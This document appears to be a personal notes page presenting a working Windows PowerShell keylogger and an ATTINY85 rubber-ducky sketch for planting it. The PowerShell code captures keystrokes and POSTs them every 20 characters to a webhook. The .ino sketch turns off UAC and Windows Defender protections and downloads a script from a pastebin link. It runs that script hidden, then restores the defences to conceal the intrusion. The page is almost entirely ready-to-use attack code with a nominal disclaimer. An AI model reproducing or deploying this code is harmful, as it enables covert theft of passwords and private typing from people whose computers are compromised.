# Keylogger

## Windows

The following are code that I have modified from [this website](https://www.andreafortuna.org/2019/05/22/how-a-keylogger-works-a-simple-powershell-example/) to fit my needs. I have made the Powershell script to use the keylogger code, but then send the code to a webhook.site website. This is meant to be used with a rubber ducky that way you can plug it in, and in 10 seconds be out of there with the keylogger up and running. The rubber ducky I will be using is a ATTINY85 Micro-controller. Using the Arduino IDE you can flash the code onto the micro-controller.

Keylogger that sends the text to a web-hook **after** the user has typed 20 characters:

```bash
function Test-KeyLogger 
{
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
  try
  {
    Write-Host 'Keylogger started. Press CTRL+C to see results...' -ForegroundColor Red
    $number = 0
    while ($true) {
      Start-Sleep -Milliseconds 40            
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $keystate = $API::GetAsyncKeyState($ascii)
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $loggedchar = New-Object -TypeName System.Text.StringBuilder    
          if ($API::ToUnicode($ascii, $virtualKey, $kbstate, $loggedchar, $loggedchar.Capacity, 0)) 
          {
            $number++
            $testing = "$testing" + "$loggedchar"
            if ($number -eq 20){
                $number = 0
                $postParams = @{username='me';moredata=$testing}
                $URL = "<Enter Webhook Here"
                Invoke-WebRequest -UseBasicParsing $URL -ContentType "application/json" -Method POST -Body "$testing"
                $testing = ""
            }
          }
        }
      }
    }
  }
  finally
  {    
    Start-Sleep -Seconds 1
  }
}

Test-KeyLogger
```

I do not endorse using this illegally or unethically. If you were to use this ethically, along with a **ATTINY85 Rubber Ducky**, this would be the **.ino** code for it:

```c
#include "DigiKeyboard.h"
//https://forum.arduino.cc/t/digikeyboard-problem/580162/2
#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F
#define KEY_LEFT_GUI 0xE3
#define KEY_ESC 0x29
#define KEY_HOME 0x4A
#define KEY_INSERT 0x49
#define KEY_NUM_LOCK 0x53
#define KEY_SCROLL_LOCK 0x47
#define KEY_CAPS_LOCK 0x39
#define KEY_TAB 0x2B

//Script is a mod of: https://github.com/JonnyBanana/Rubber-Ducky_Disable_Windows-Defender_Technician-Edition
void setup() {

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); //start search
  DigiKeyboard.delay(1000);
  //UAC notifications
  DigiKeyboard.println("settings: uac"); //User Access Control -- This works better for me than just "uac" but to each their own
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //The window should close automatically, so the next 2 lines are just a contingency
  /*
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT,KEY_F4);
  DigiKeyboard.delay(1000);
  */        

  //Security Takedown
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); //start search
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Virus &"); //Virus and Threat protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Accessing the Manage settings for Virus & thread protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Real-time protection disable
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Cloud-delivered Protection Disable
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Automatic sample submission disable 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); //Skip over "Submit a sample manually" option and go to Tamper Protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Tamper Protection disable
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_F4); //start search
  DigiKeyboard.delay(1000);
  //Powershell program running
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs"); //run powershell as admin
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("cd $Env:temp"); //Jumping to temporary dir
  DigiKeyboard.delay(750);
  DigiKeyboard.println("Set-ExecutionPolicy RemoteSigned -Scope CurrentUser");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Y");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("curl <pastebin.com link> -o script.ps1");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Start-Process powershell -WindowStyle Hidden .\\script.ps1");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("Set-ExecutionPolicy RemoteSigned -Scope CurrentUser"); //Change it back to No
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //start run
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(500);
  //Setting up Windows Security once more
  //Security Put-Up
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); //start search
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Virus &"); //Virus and Threat protection
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Accessing the Manage settings for Virus & thread protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Real-time protection enable
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Go over "Cloud-delivered protection" warning
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Cloud-delivered Protection Enable
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Go over "Automatic sample submission" warning
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Automatic sample submission enable
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); //Skip over "Submit a sample manually" option and go to Tamper Protection
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); //Skip over "Tamper protection is off" warning
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE); //Tamper Protection enable
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_F4); //close the window
  DigiKeyboard.delay(1000);
  //Enable UAC again
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); //start search
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("settings: uac"); //User Access Control -- This works better for me than just "uac" but to each their own
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW); //Taking it back to default settings
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //Warning or a way to tell a person you got their computer
  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); //start search
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell"); 
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("echo \"I got your computer\" >> text.txt; notepad text.txt; exit"); 
  DigiKeyboard.delay(2000);

  /*
  DigiKeyboard.println("");
  DigiKeyboard.delay(500);
  */

}

void loop() {
  // unused - blink the LED maybe?

}
```

{% hint style="warning" %}
This ATTINY85 script ONLY works for computers with Windows Defender/Security on it. If you want to use it for a computer with Malwarebytes/Kaspersky/Avast, you will have to modify the code yourself.
{% endhint %}

### Sources I used for research:

* [https://www.andreafortuna.org/2019/05/22/how-a-keylogger-works-a-simple-powershell-example/​](https://www.andreafortuna.org/2019/05/22/how-a-keylogger-works-a-simple-powershell-example/​)
* [https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using​](https://docs.microsoft.com/en-us/microsoftteams/platform/webhooks-and-connectors/how-to/connectors-using​)
* [https://thinkrethink.net/2017/12/14/call-a-webhook-from-inline-powershell/​](https://thinkrethink.net/2017/12/14/call-a-webhook-from-inline-powershell/​)
* [https://stackoverflow.com/questions/2426993/run-a-batch-file-every-x-number-of-seconds-using-powershell​](https://stackoverflow.com/questions/2426993/run-a-batch-file-every-x-number-of-seconds-using-powershell​)
* [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html​](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html​)
* [https://github.com/yokokho/another-rubber-duck-payloads/blob/master/payload/Turn-Off-UAC-ETC.md​](https://github.com/yokokho/another-rubber-duck-payloads/blob/master/payload/Turn-Off-UAC-ETC.md​)
* [https://inc0x0.com/2018/10/budget-usb-rubber-ducky-digispark-attiny85/​](https://inc0x0.com/2018/10/budget-usb-rubber-ducky-digispark-attiny85/​)
* [https://github.com/CedArctic/DigiSpark-Scripts/blob/master/Create\_Account/Create\_Account.ino​](https://github.com/CedArctic/DigiSpark-Scripts/blob/master/Create_Account/Create_Account.ino​)
* [https://github.com/danielbohannon/Invoke-Obfuscation​](https://github.com/danielbohannon/Invoke-Obfuscation​)
* [https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/​](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/​)

